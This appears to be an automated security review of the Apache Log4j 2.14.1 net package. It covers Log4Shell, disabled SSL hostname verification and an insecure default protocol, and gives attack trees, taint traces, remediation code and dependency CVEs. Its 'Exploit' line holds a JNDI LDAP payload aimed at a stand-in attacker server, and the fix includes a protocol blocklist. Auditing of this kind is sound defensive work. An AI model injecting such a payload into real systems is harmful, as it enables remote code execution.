# Security Review: Apache Log4j 2.14.1 `net` Package

## CRITICAL

### CVE-2021-44228 (Log4Shell) — JNDI `lookup(name)` executes attacker-controlled JNDI URLs
- **File:** `JndiManager.java:172`
- **Evidence:**
  ```java
  public <T> T lookup(final String name) throws NamingException {
      return (T) this.context.lookup(name);
  }
  ```
- **Attack Tree:**
  ```
  StrSubstitutor.substitute (pattern/MessagePatternConverter.java:60)
    └─ MessagePatternConverter handles log message text containing ${jndi:ldap://attacker}
      └─ StrSubstitutor.resolveVariable → StrLookup.lookup → JndiLookup.lookup
        └─ JndiLookup.java:56 — jndiManager.lookup(jndiName) passes unfiltered attacker input
          └─ JndiManager.java:172 — context.lookup(jndiName) executes JNDI lookup
            └─ JNDI Provider fetches attacker-controlled LDAP/RMI URL
              └─ Java Deserialization of remote object → Class Loading → RCE
  ```
- **Taint Trace:**
  ```
  taint_trace: lossy — every returned path is a hypothesis
  index: language=Java, files=37, defs=308, calls=689, unresolved_callees=0
  Path 1 (depth 1, resolved 2/2 hops):
    JndiManager.java:171 [byte 7457-7524] — fn `lookup` — taint root: name
    └─ JndiManager.java:172 [byte 7525-7570] — [SINK REACHED] — tainted at sink: name
  ```
- **Impact:** Remote code execution via deserialization of attacker-controlled objects fetched through JNDI LDAP/RMI. Any log message containing `${jndi:ldap://attacker/evil}` triggers the lookup and loads/executes remote code.
- **Exploit:** `${jndi:ldap://attacker-server.example.com:1389/EvilClass}`
- **Remediation:** 
  ```java
  // Add blocklist at JndiManager.java:172
  public <T> T lookup(final String name) throws NamingException {
      if (name != null && (name.startsWith("ldap:") || name.startsWith("ldaps:") || 
          name.startsWith("rmi:") || name.startsWith("dns:") || name.startsWith("iiop:") ||
          name.startsWith("corba:") || name.startsWith("nds:"))) {
          throw new SecurityException("JNDI lookup for protocol " + name + " is not allowed");
      }
      return (T) this.context.lookup(name);
  }
  ```
  The complete fix requires removing JndiLookup class or upgrading to 2.15.0+, with additional fixes at 2.16.0 for bypass prevention.

## HIGH

### SSL Hostname Verification Disabled by Default
- **File:** `ssl/SslConfiguration.java:238`
- **Evidence:**
  ```java
  @PluginFactory
  public static SslConfiguration createSSLConfiguration(
      @PluginAttribute("protocol") final String protocol,
      @PluginElement("KeyStore") final KeyStoreConfiguration keyStoreConfig,
      @PluginElement("TrustStore") final TrustStoreConfiguration trustStoreConfig) {
      return new SslConfiguration(protocol, keyStoreConfig, trustStoreConfig, false); // verifyHostName=false!
  }
  ```
- **Attack Tree:**
  ```
  UrlConnectionFactory.java:70-73 — HTTPS connection uses SslConfiguration
    └─ SslConfiguration.isVerifyHostName() returns false (default from createSSLConfiguration)
      └─ LaxHostnameVerifier.INSTANCE passed to HttpsURLConnection.setHostnameVerifier()
        └─ LaxHostnameVerifier.java:36 — verify() returns true for ANY hostname
          └─ MITM attacker can serve invalid certificate for any hostname → traffic interception
  ```
- **Impact:** Man-in-the-middle attacks on HTTPS connections. SSL connections accept certificates for any hostname without verification.
- **Remediation:**
  ```java
  // Change SslConfiguration.java:238
  return new SslConfiguration(protocol, keyStoreConfig, trustStoreConfig, true); // verifyHostName=true by default
  ```

## MEDIUM

### Default SSL Protocol "SSL" is Insecure
- **File:** `ssl/SslConfigurationDefaults.java:25`
- **Evidence:**
  ```java
  public static final String PROTOCOL = "SSL";
  ```
- **Attack Tree:**
  ```
  SslConfiguration.java:56 — sslContext uses protocol from defaults
    └─ SslConfigurationDefaults.PROTOCOL = "SSL" (deprecated, vulnerable)
      └─ SSLContext.getInstance("SSL") uses protocol known to be vulnerable
        └─ Attacker can exploit known SSL protocol weaknesses (POODLE, BEAST, etc.)
  ```
- **Impact:** Connections may fall back to deprecated SSL protocol vulnerable to known attacks. While modern JVMs may reject this, the default configuration encourages insecure protocol usage.
- **Remediation:**
  ```java
  // Change ssl/SslConfigurationDefaults.java:25
  public static final String PROTOCOL = "TLS";
  ```

## LOW / INFORMATIONAL

- `JndiLookup.java:70-72` — The `convertJndiName` method accepts JNDI names with colons (`:`) without validation, allowing arbitrary protocol prefixes. This is inherent to the JNDI design and is addressed by the CRITICAL finding above.

## Checked and Cleared

- `JndiManager.java:52-53` — `getDefaultManager()` uses default InitialContext but doesn't expose a direct external entry point; the vulnerability is in `lookup()` parameter handling
- `JndiManager.java:62-63` — `getDefaultManager(String name)` creates manager by name but the vulnerability manifests during `lookup()` execution, not manager creation
- `JndiManager.java:85-87` — `getJndiManager(...)` with explicit parameters requires application developer configuration, not attacker-controlled input
- `JndiManager.java:98-99` — `getJndiManager(Properties)` requires developer configuration, not external input
- `UrlConnectionFactory.java:48` — `url.openConnection()` receives URL from application code, not directly from log messages
- `UrlConnectionFactory.java:63-75` — HTTP connection setup uses application-provided URLs, not attacker-controlled log content
- `JndiManager.java:180` — `new InitialContext(data)` where `data` comes from application configuration, not attacker input
- `ssl/` directory files (except noted above) — SSL configuration classes handle application-provided keystores and truststores

## Dependencies

The `dependency_review` subagent identified that Apache Log4j 2.14.1 is a standalone target library. Known vulnerabilities confirmed:

- **CVE-2021-44228** — CRITICAL (CVSS 10.0) — Remote Code Execution via JNDI lookup in log messages. **[fixed in: 2.15.0]** (covered as CRITICAL finding above)
- **CVE-2021-45046** — CRITICAL (CVSS 9.0) — Incomplete fix for CVE-2021-44228 via Thread Context Map bypass. **[fixed in: 2.16.0]**
- **CVE-2021-45105** — HIGH (CVSS 7.5) — Denial of Service via Context Lookups. **[fixed in: 2.17.0]**
- **CVE-2021-4104** — HIGH (CVSS 7.4) — Deserialization of untrusted data via JMSAppender. **[fixed in: 2.17.1]**
- **CVE-2021-44832** — MEDIUM (CVSS 6.6) — Remote code execution via JDBC Appender configuration access. **[fixed in: 2.17.1]**

## Remediation Summary

### Immediate (CRITICAL/HIGH)
1. `JndiManager.java:172` — Block JNDI lookups for ldap://, rmi://, dns://, and other dangerous protocols OR upgrade to log4j-core 2.17.1+
2. `SslConfiguration.java:238` — Change default `verifyHostName` from `false` to `true`

### Short-term (MEDIUM)
1. `SslConfigurationDefaults.java:25` — Change default protocol from "SSL" to "TLS"

### Hardening (LOW)
1. `JndiLookup.java:51-74` — Implement comprehensive JNDI name validation and blocklist
2. Review and disable Thread Context Map lookups (CVE-2021-45046, CVE-2021-45105) via application configuration